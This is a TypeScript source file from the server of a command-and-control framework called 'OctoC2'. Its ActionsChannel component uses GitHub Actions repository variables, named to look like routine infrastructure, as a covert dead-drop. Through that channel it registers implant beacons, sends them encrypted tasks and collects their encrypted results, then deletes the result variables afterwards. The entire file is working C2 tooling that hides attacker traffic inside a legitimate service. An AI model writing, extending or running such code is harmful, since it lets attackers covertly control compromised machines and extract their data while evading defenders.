/**
 * OctoC2 Server — ActionsChannel
 *
 * Polls GitHub Actions Variables every pollIntervalMs for beacon activity.
 * All communication uses the Variables API as a dead-drop channel:
 *
 *   INFRA_STATUS_{ID8}      — Beacon → Server  ACK / registration  { k: pubkey, t: ts }
 *   INFRA_JOB_{ID8}         — Server → Beacon  Encrypted Task[] blob (JSON encryptBox envelope)
 *   INFRA_RESULT_{TASKID8}  — Beacon → Server  Sealed TaskResult blob (sealedB64)
 *
 * Variable name prefixes used for scanning:
 *   ACK prefix:    "INFRA_STATUS_"
 *   Result prefix: "INFRA_RESULT_"
 *
 * Crypto:
 *   Incoming results (beacon → server): crypto_box_seal — openSealBox()
 *   Outgoing tasks   (server → beacon): crypto_box      — encryptForBeacon()
 */

import type { Octokit } from "@octokit/rest";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import {
  openSealBox, encryptForBeacon,
  base64ToBytes, bytesToBase64,
} from "../crypto/sodium.ts";
import { createRequire } from "node:module";
import type _SodiumModule from "libsodium-wrappers";

const _sodium = createRequire(import.meta.url)("libsodium-wrappers") as typeof _SodiumModule;

interface ActionsChannelOpts {
  owner:             string;
  repo:              string;
  token:             string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs:    number;
  octokit:           Octokit;
}

interface AckPayload {
  /** Beacon public key (base64url) */
  k: string;
  /** Checkin timestamp (ISO-8601) */
  t: string;
}

interface ResultPayload {
  taskId:      string;
  beaconId:    string;
  success:     boolean;
  output:      string;
  completedAt: string;
}

export class ActionsChannel {
  private timer: ReturnType<typeof setInterval> | null = null;

  /**
   * Map from id8 → beaconId for beacons registered via the ACK variable.
   * We use id8 as the key because the ACK variable name only encodes id8.
   */
  private readonly actionsBeacons = new Map<string, string>(); // id8 → beaconId

  /** id8 values whose ACK variable we have already processed */
  private readonly seenAckId8s = new Set<string>();

  /** taskId8 values whose RESULT variable we have already processed */
  private readonly seenResultId8s = new Set<string>();

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue:    TaskQueue,
    private readonly opts:     ActionsChannelOpts,
  ) {}

  start(): void {
    if (this.timer) return;
    this.timer = setInterval(() => {
      this.poll().catch(err =>
        console.error("[ActionsChannel] Poll error:", (err as Error).message)
      );
    }, this.opts.pollIntervalMs);
    console.log("[ActionsChannel] Started polling");
  }

  stop(): void {
    if (this.timer) {
      clearInterval(this.timer);
      this.timer = null;
      console.log("[ActionsChannel] Stopped");
    }
  }

  private async poll(): Promise<void> {
    const { owner, repo } = this.opts;
    await this.processAckVariables(owner, repo);
    await this.processResultVariables(owner, repo);
    await this.deliverPendingTasks(owner, repo);
  }

  /**
   * List all repo variables and filter for names matching INFRA_STATUS_*.
   * Each matching variable registers the beacon in the registry.
   */
  private async processAckVariables(owner: string, repo: string): Promise<void> {
    let variables: any[];
    try {
      const resp = await this.opts.octokit.rest.actions.listRepoVariables({
        owner, repo, per_page: 100,
      });
      variables = (resp.data as any).variables ?? [];
    } catch (err) {
      console.warn("[ActionsChannel] Failed to list variables:", (err as Error).message);
      return;
    }

    for (const variable of variables) {
      const name: string = variable.name ?? "";
      if (!name.startsWith("INFRA_STATUS_")) continue;

      const id8 = name.slice("INFRA_STATUS_".length);
      if (!id8 || this.seenAckId8s.has(id8)) continue;
      this.seenAckId8s.add(id8);

      try {
        let ack: AckPayload;
        try {
          ack = JSON.parse(variable.value ?? "{}") as AckPayload;
        } catch {
          continue;
        }
        if (!ack.k) continue;

        // Reuse existing beaconId if one was registered with this id8 prefix
        const existingBeacon = this.registry.getAll().find(
          b => b.beaconId.startsWith(id8)
        );
        const beaconId = existingBeacon?.beaconId ?? id8;

        this.registry.register({
          beaconId,
          issueNumber: 0,
          publicKey:   ack.k,
          hostname:    "unknown",
          username:    "unknown",
          os:          "unknown",
          arch:        "unknown",
          seq:         0,
        });
        this.actionsBeacons.set(id8, beaconId);

        console.log(`[ActionsChannel] Registered beacon ${beaconId} from ACK variable ${name}`);
      } catch (err) {
        console.warn("[ActionsChannel] ACK processing error:", (err as Error).message);
      }
    }
  }

  /**
   * List all repo variables and filter for names matching INFRA_RESULT_*.
   * Each matching variable contains a sealed TaskResult; decrypt, mark
   * task completed, and delete the variable.
   */
  private async processResultVariables(owner: string, repo: string): Promise<void> {
    let variables: any[];
    try {
      const resp = await this.opts.octokit.rest.actions.listRepoVariables({
        owner, repo, per_page: 100,
      });
      variables = (resp.data as any).variables ?? [];
    } catch (err) {
      console.warn("[ActionsChannel] Failed to list variables:", (err as Error).message);
      return;
    }

    for (const variable of variables) {
      const name: string = variable.name ?? "";
      if (!name.startsWith("INFRA_RESULT_")) continue;

      const taskId8 = name.slice("INFRA_RESULT_".length);
      if (!taskId8 || this.seenResultId8s.has(taskId8)) continue;

      try {
        const sealed = (variable.value ?? "").trim();
        if (!sealed) continue;

        await _sodium.ready;
        const operatorPublicKey = _sodium.crypto_scalarmult_base(this.opts.operatorSecretKey);

        const plainBytes = await openSealBox(sealed, operatorPublicKey, this.opts.operatorSecretKey);
        const plain = new TextDecoder().decode(plainBytes);
        const result = JSON.parse(plain) as ResultPayload;

        if (result.taskId) {
          this.queue.markCompleted(result.taskId, plain);
          this.seenResultId8s.add(taskId8);
          console.log(`[ActionsChannel] Task ${result.taskId} completed (success=${result.success})`);
        }

        try {
          await this.opts.octokit.rest.actions.deleteRepoVariable({
            owner, repo, name,
          });
        } catch { /* best-effort */ }
      } catch (err) {
        console.warn("[ActionsChannel] Result processing error:", (err as Error).message);
      }
    }
  }

  /**
   * For each registered actions beacon with pending tasks:
   * encrypt the Task[] and write a `INFRA_JOB_{ID8}` variable.
   */
  private async deliverPendingTasks(owner: string, repo: string): Promise<void> {
    for (const [id8, beaconId] of this.actionsBeacons) {
      const allPending = this.queue.getPendingTasks(beaconId);
      const pending = allPending.filter(
        t => !t.preferredChannel || t.preferredChannel === "actions"
      );
      if (pending.length === 0) continue;

      const beacon = this.registry.get(beaconId);
      if (!beacon) continue;

      try {
        const beaconPublicKey = await base64ToBytes(beacon.publicKey);
        const taskJson = JSON.stringify(pending.map(t => ({
          taskId: t.taskId,
          kind:   t.kind,
          args:   t.args,
          ref:    t.ref,
        })));

        const encrypted = await encryptForBeacon(
          taskJson,
          beaconPublicKey,
          this.opts.operatorSecretKey,
        );

        const varName = `INFRA_JOB_${id8}`;

        try {
          await this.opts.octokit.rest.actions.updateRepoVariable({
            owner, repo, name: varName,
            value: JSON.stringify(encrypted),
          });
        } catch (err: any) {
          if (err?.status === 404) {
            await this.opts.octokit.rest.actions.createRepoVariable({
              owner, repo, name: varName,
              value: JSON.stringify(encrypted),
            });
          } else {
            throw err;
          }
        }

        for (const t of pending) {
          this.queue.markDelivered(t.taskId);
        }

        console.log(`[ActionsChannel] Delivered ${pending.length} task(s) to beacon ${beaconId}`);
      } catch (err) {
        console.warn(`[ActionsChannel] Task delivery error for ${beaconId}:`, (err as Error).message);
      }
    }
  }
}
